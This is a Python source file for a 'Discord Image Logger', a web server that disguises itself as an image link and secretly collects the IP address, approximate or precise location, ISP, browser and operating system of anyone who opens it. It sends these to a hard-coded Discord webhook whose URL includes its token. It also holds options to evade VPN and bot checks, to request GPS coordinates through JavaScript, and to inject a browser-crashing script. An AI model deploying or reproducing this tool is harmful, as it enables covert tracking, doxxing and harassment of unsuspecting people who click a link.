# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1498510474063384576/gD4yzrBGXrT4P0IXMMGsjHlAMHvbgsnnzlOA75dA3CYGmp9XldlHxZDWhqoy14VpACNG",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUTExMVFhUXGBcXGBcYFxoXGBcdGBcaGhcYFxgYHSggGBolGxcYIjEhJSkrLi4uHR8zODMtNygtLisBCgoKDg0OGhAQGi0lHyUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIANwA3AMBIgACEQEDEQH/xAAcAAACAgMBAQAAAAAAAAAAAAAEBQMGAQIHAAj/xAA6EAABAwIEAwYDBgYCAwAAAAABAAIDBBEFEiExBkFREzJhcYGRIqHwFEKxwdHhBzNSYpLxI0MVFnL/xAAZAQADAQEBAAAAAAAAAAAAAAABAgMABAX/xAAgEQADAQADAAMBAQEAAAAAAAAAAQIRAxIhBBMxQVEi/9oADAMBAAIRAxEAPwCwhZWAshdxymdVpM7kpULIblS5r6yV4p7UaPksCTsAqHiVUZZC7r+HIKzcS1mSPIN3fgqrTx/eK4uGNenbTxYM8KZl+Ibpv9uf1SiGdosLqesnDWZrjXZdrSwiTV+Lua3cX6Kv1NY+Q/EUPJIXG5UsNOXEWXHyWv4VmTRoF9lMGk7Any1RdPSNabv1KcURsdAB6LndFVIqocLkfrkNvJM6jApBbKN9/BWWIXb3hdRva++jlN0N1KzXYG8iwKDbw5INyPmVcXseAhXvddbsw4U2pwCXrdAy0T2C2Um3NXt2boh5dPuhMrYOqKC6/MEeil3VnrHDUZAktRCw90gOTqhXIEHEKzcMVwc5rXdR+KrTonDf3XoJMpuL6J08EaPp1h0WshVG/hzxV9oZ2MnfYND1CupKnRPPTBKglfvqt5CgnvSDpE8D9N1O1yEpvrqpxdYzKVdeFlghZAXuHmmJHaIcKScoHEZskTje2mi4fk1tYdnx580qWN1RklPMbBRPFmgeq9Tw5nj3K9Vuu89ArRPVBb0gyhQVVRYWup5gQ26Ww6u11/BT5bzxDTOhNLDf4nbdOqZtDuZyN+t1Cxp5WBWsrI9ny+gXFTOiUFmojZezrn3U1Iyea+RzGf8A15pW2emjPN3PVFR8TsbsNuSR6OhiMIrdu2i/yy/ithQ4g3bI4f2vBWsOK0tSD2jHNPULQ0EjfipZi8D7pNigE86qqm99jgpYcTeNwSfVQwcQSN+GRpDh1CndxUGjRuvgFgEhxWXlC4+iCkxGoP8A0GynpZq2oubiKPm5wsT5L1ZiLIW5c5kcNz+ixhVPiLh3mOb5hBSvjk2Nj1XqniO5N2+40+aCmroH7tserT+SpKFYQC9u/wAbfrdaSwhwJYdtbKGCN/8A1vJHQ/upWym/xtIP9QGnqnEDuF8a7CoY++x15aLv9HWslY17HAhwBC+apWWdcbHor7/DfGnNk7Fx0O2qFLRTrchQjipjJohJX6WU8MEU51U4f4oOJykBCOAKqvLBXivZbPOB5DcpJxPPZjW9TqnVkjxWjlnkDY2E28NNd9V5rreTWehCyBbh0fwud0UuE4DJM+2wvcm3RWrCeEZAwCQtb1tqbKyRwMgjOUAZRdPz/KU+SCONtnIuNCI5OwZszfxPNIaEXKlxitMs8jzrdx19V6hPOy5021rKtLcQxbFm0Kw7DITuD7oKsqZO60eqGBe3Um5/dDGxtwsLMFpGjM8E+GYqOXEIGCzGMAHK1yqzNUnqUHI4lFQB0Pa7E84s2w8tENhuKyRPFyUshcmMFK52pHumcpA7Mu1Pj0MgHaRgnqt34vTx6iMXVLFM8HRbT0z7KbhaMmT4zxJLMcjXWaNLDZRUU4Z3tSeqipsONr21QlUxwJCdSgNliFdCR8TG+yj+w0h1sAfP8lWH1Tx/pDy1TrpuoulnmhH/AFyBqHzzN3Ac3w/RVvtndUxw3FXtOpuOaPXDaGzOB1At4Jhw5Whk7HDqPxS3EZbgOFrHoocOqS17T0I+vkhhjvtJibnXuNLaJXV4nJy2RdHQ5mNc11rtBsfEKOopn2tbmpTcmcsmwiXPfM54da7R1WXxS3NyR4XQlLO5hu02I2KkfVvJuXEkqyxi4yErxaTsEW2k6o6kgAtcKnL82Ev+SEfGp+sFpMI2Ljz2TeCANGgWzpg39UJU4q1v19WXlVbp6dql/iJ6yoyC6pnFOPZYn2Op0HqscRcRixA9lzbF8VMjrX0TccOmV8hAIJLtE1gAA0GqWUAu5PqOC7vBddeEEtBmUckmuykdRWGosrBLI1jbfNVvEMTFzqkVNjuEgCelbdRikCw+tH0VmOe5/dU1iYiaClbcaBWCCJthsq62RFRVx2SthSHDgAtRlJslZrrrRlVY39kMYxYw1jW8lXawNLivVNffRAum3TJYBms1MCoBSAKZ0qHdUjrqnEaN20zVuMNB7qgbVNKYUVYB5LGwClpnNBB2QoksVY6shzLhVqXdFMDR3ThfEw6CO5+6Bb0VnZKHb/7XCOH8aczKCdNl0nBscuLEhcPJDTOiUqRYauiG/JLXQdE2pq5rh1W7ox9EJVdI3Vf1Cz7c1h1KKbXgjcLnk9ab316fNT0uL9f9IdCrSZcq3FQ0G6qWMY4Be315JbiuJ5tLquzSk63TxxitpfhHiuIF26QB93KSvk1KBpnm67InEc11rLFhW/inwlyjxSTCBsmNe/T690lfoZA6ysc8lt7AbnogpBAP65TzsbDy0W2H0Uk8jYWfedr5K9YzHTYbHHFEyN9Q8XDpDZrbC5J8dE0yaqOaywW1yOaDtdZgNvFW+o40bO6LtII2xkNjda2YOt8TgBs0lA8SYM1hzRd3eyphPRU3VZWlLr6I2GnzKbRRMHD14vTKPD7mwFz4LSto3MGrSL9UNDgpkfdaXU741pkTCg87lpBRPf3Wk+QT3hnBmzytEriyMHUgZj7KycT1kVJEBBlzk5QNja3eVJQjZz+aiezVzCB5LeJw5eybYdxE9sre2LZI5LXAt8N+XmtuKsKZDIHRfy36gdP22TOQJkVO/QpNUj4imVPtdLqzcqaGZHFJ4qwYbizm6XVcjRcTkKSY0vDo+EY/1KtNPjLcu64/TSn1T2GskA0K5q4v8Lze/pEawndyi+03KCc8lbRNRwGhD5roacG2in2U7KUutZH8N+lYrYzul8LTfQH2V5qcCeW93dI8OkNLMc7dCMpuFaa8I1IThI0HijMQZc2Gq9GwZ7t2OvumlHEC65UqoeZN+GmiJ99M2lioOPMPfMWSWucttfyUOJaP00XoeIJ2CwfdvRwDh81pp/w1SVvDcGkfI3SwBB+aumIXDRcHayX/APtM4Hw9m3yjaD72S+rxOWTvOJv4qvdidDDoml3w6Jrh1IXGzQoMHoi46qz0rQzQfupXeFInR9w3hEbXDS7uql4vwtjha3speHX/ABA25KTiqbXQbBc3Z6Uz/rDk1fQmNxBGiELArJilnAg7qvubbRdUVpO5wbYVWNZvoEPxVTdu0PjNy3klkhW8NW5ux+SsqaJORXh+FPLxmGUDr4Ky4vLnaG9NkF9scd1jPdZ3puoMGnVLqqLXRNnIKrOXXUfggmZoChpHnutJ8gmNLg8zjYMI9F07hWja2CMlguWgnTXXVOzMzYgWUK5vcKzxf05N/wCGmjF3NNhzU8cwsug4jVMaCLXaeu4VQqKNhcSDYdEFyNj9MK48reJ1itezdfRrj6FZELubXD0T4T0le9H4Y6x3S9gJRjZANkrHRZ6WrDR9WVe4xax0YcAM2b3utG1hAQtW8yWZ4pZWManqNqLSw8E7oLDpzSajhJDncmkBMY5NEWKiTFKS4zBJZab61VugaHRgFKKqnsTollha0QGBF0dFmOyKFPcp3RUWUXKZ1gqnSKlhylGwxElEUdKzeRwaNdLpzH9nsMrgouiqWE2CQkEKTH49rjcKKLEY4zo4FB4vjIfz8AEgc90quKU5zX1SSoivqrhT1DHOOci3yQ9bQUzu6/KfPRWmsEudKcYioXRlWKXCrbOB6c0BPR23XQqTJORcxq3CmyBeyogIXtIQlSzMB7o6VQW1RAdJw+fJExt9mt/BD1tUTskbMUu0C/JQzV1+a5XHp0KsRNX1ZIKUfaD4/NSSzXUVyqKUhN06sIgNgPYLzoGndoPoFJzWV6XVHj9n/pWMd4ZY4Zo/hdzHJVCroXsNnNOi6jUAFpQAY0jVoPmuX5Epeo7Pj8jf6czIWKSTLKxx1AIJHUX1XR38N08rXHKWu6t/RVPHOH3U9nXu29gVzajq0JrsMIjdNGR2TnXy8x5pQ9+miPr5HiINbfKdbfglGa3oshmMcOncAQTojwQ5IGykJhTzXtr9fpog0GWOqKnaFNiE2Vlx5KOkeFpjEBdEbX01U2OUPHMbkzEB3la+iDw/iGRp+Jxsp8Uw8v1bZKxhUv8ASuuZnDmp1pbIcZLhcOWZ8ROupHqq3S0rozrfVSz5iCB7oOFoyt4FYhjlhZp1SxmMSXuXIaSheOV1PR4cTqQnUykT7VpceHMQLrNKc1EYI2ukXD9LueicyS/moV4y0+oXzwAFCSKepmQEklymQGavNyh3u10RDwieHMHfVy5GWBsXEnYC4v8Ainf4ICw3CIDCuk0PAkMdu0cZDbyb7LGKcJRPczs/+MN3A1zed1z/AGy6wf8AhzcPF7E6o1lFcXyn5rpWH8F07XZsgc48zsn0eFMAtlaPQKjYndCY7rywslekeUDVxOR3kllDNpY8kzr/AOWfJV+J9jdT5Y7ThbivqyxUM+V3gdFJj+GCWNzOou3wKXwyAi6fUEnaMIO4XmUurO9PTn0FFMI7WuQS2x8Oir9fTFjy12+/uuoV9PY3+vrdczxfEO1mcLbaeypIdAXBT0jrKLs1s02RaCmWGglvsnVU60Eh55T81WMOltZN3VALS06jmo0vS0vwqbKU3vdMBSvtsmbY2N7oTCjpnybXA9k/cXoVOoo3N3booOyFtl0KXB76E3uoHcNs6WWXKD6ygf8Aj3HUDRQPaRvor5iGEho0KqtVHqQRZUnkTEcYYwOfKSDz/JF1s1kni+FyLmlutS9MmDSuJWGsW4bdTNjATpCtkkOGSzDLFG55525eq6ZwRwyaOMmT+bJa/wDaBs0H8Vn+HFB2dO6QjWR1/QaD81aJktMRshetXNG6hkl1W4dopYEmbUZRZRmr8UBUzoMz+JRATFYWSsgL1DzSCrbdhHgqyrTL3T5FVZwsSsMgugl1snFFUFjgVXGusbhNaaa4XD8njx6dnBerCwYvS9pGS3TMD6LhlTTPgqHNfffU9ddF27C60AZHbHZJeNuFRO3tIx8bRfzCjx1nhZnPTqtSFLkINiLW0WSqNhSPQPt7oxsw258kvJspIpCAXb8gPJTaKSxyyRrLFxBKKGJ2F81vIqoOkedblQyPPM/Nb69D3Lo3H2g94qao4muNHBc6nqw3nfwUTMRaTrom+kH2F4GM5jq/3Q9ZM1+9vNVpjuYKma89Sj9aQHeklS2x/NRsOqlNy1R04uQnSwQKYNEbh9G6WRsbd3G3l1KhZGr7wNhIa3t3CxOjb9OoWbwUtdND2bGxt2aAB6KN9SVM54Q84+ai36A1h11UNZU2NgpXOyNJ5lI6mfXdYJPmLjYIJ1RroCR1AuPxSrGq/KCASCEho8XcW6k6XCYZSdKIWQvBeXpHlGtlWq+PK8qzpHjcdnX6rBQsUsEuUqJeQqVSxjTTT1Dpjr6hPMKrgRkefJVCnnynwTSKTYheby8ThnfHIrRUeLoOyrJRyJDvcXS9rbptxzczNeebAL+LT/pJKSXkivwoZmiQk9WGN1TOduiRV1LnRRiCbGxyb7pbJWuPO3kvVdA9h20QwXRMom2ZKxZSNhPRbmnP7KngDSOdzdvZMqPF2E/EDf5JU4dVmipSbJKlGTLRT1IfeyJpYtbpdQU+VOqVvw3U8H0ZYHh5qJ2RN+8dT/SBufZXqra+BxjYDlboPEJL/CtgNTK87NZYdPiP6BdExKNpFwLn8VOxN9KizEpObbKZlcCdbqWoqLaGM/XVASHNo1lio+jmMRrc223RL5hkaXv2AuisLgEksjD3mNLi3mg8Rwioqj2Ubcred9PdFGKbXz5y5xKlw3BnvjDhsV0+g4HpY2NbJGJH21Jvr5ap9SYNExoayJoaNgnB3K52i3Tmr4ec55c0tAJ0GqGfgkrRyPkupcjX6cz45f4L0Di0OZmnJHSEtOVzSD4hFswp7wRbTqqfbJL6qRRV5OqrAHtdY6Dr0U9FgIJ1JcPYJvsn9N9dfghihc7ugnyRlHE/NbK7ysrvh9GGWDW2/NEVLiC0dVy8vMqWYX4+Pq90o3HuFhtJG/7zHa+Tv3C5mXFrr+67fxaL0cwsO6D81xavh1UZOlDUODhcIPs7OHmtcJnuMp0I2RrY7uRCQVtGS3ORdt7fmq7XYeAcwGnRWmZxtl+705IR0Wbu6+HNPNNAa0rjR1WJD4Kw07WjeNrh4jVZMLD3WBvlr+KfuDqViHDZH8tPFOKaiLfBMxpusVMwOjRYdN0HbYVIPGEXK/K1RxttqdEJVTXNkAMv38PonCnllB1c+3+I3+au9BVl7NdLfokfAUOWij8cx9ynFKGgkDe6ShCQylxtZYw+nzl2YWsdLKWIBmZx5AnystcKrg5hPP8Aa/JK8MB0PBrGVJqGSyDe7L/CT4nmPBWCOgcJGvuLC+nVb4ROHgnxsmKpEJ+k6t7hrkG62svLyviJGLLy8soYYjdC07gH0C3yrK8tiNoJW0mcDwPuFBT0IabW0TFeSOExlTNBEBySDiBxa+Ii9s+p/JWNAYxQdrGRzGrT4jUIXHgZr0W1tGJI3Ru2c0g+osuJYlTFhLHbtJafRd5iAyjy18+a5r/EfCMknbN7r7ZvA/uorw6JZzcS5HAhOIqnZw80nqWrWnqMuh25KjWhTHsrr6g6H69EMyVzXAgkEc0HFXZNxdv1spxOx3dI8juglg+hdNXlhccrXZgQczQ7fmOh8Vp246fND2WpeOoRwxLJKStAPZQuqGjdw90M+rvoNkUgNh01RoTdAQuufVRSyX0unHDGEunkAA+EH4ncvLzRSJtnWuEtKOEf2390ZEwiQ25rSkY1oaBo1osPIBE055+KWkDTWsbna9gNi4WulOBvLJHRnyCcTstJcbJfXUtp45GjcgO80jRiy4FCWBw8bhNVFE2ylVoWIhT1nlleXlQUwsrCygY8vLy8iYwQsry8sY9ZeK8vLGEGJu7OUE91+nkf3WMQpWTRujkAc124O6Lx+EOhdfkLj02SnDpS5gJPL8v3XJfjOifUcy4m4GkhJdDeSPe33h+oVIqmEaOBB6HRfRVvySytweCX+ZEx3jbXlzCaaG0+f+2I0OywZR5LstVwTRG//FbTk4hKKrgWj3yO/wAyqg05mKn+5RzTX5qy1nDMDXGwd/ktqbh2C17H3TYbSpsHNTR3OjRfwGq6bgnClLlzGPMb2+Ikj60T+loIo+5G1vkAFsNpz/A+DZpLOlPZs6buPpyXRcLw9kLAxgsPx8T1KJYwLdHAGQ6yYxG2UH6+roKmZd2vipp+8Prkp16zB1QQdlJTUwfa/UH2S+MahWTDoxlBtul6+4B1iCmhbLy8rJEDy8vLyJj/2Q==", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
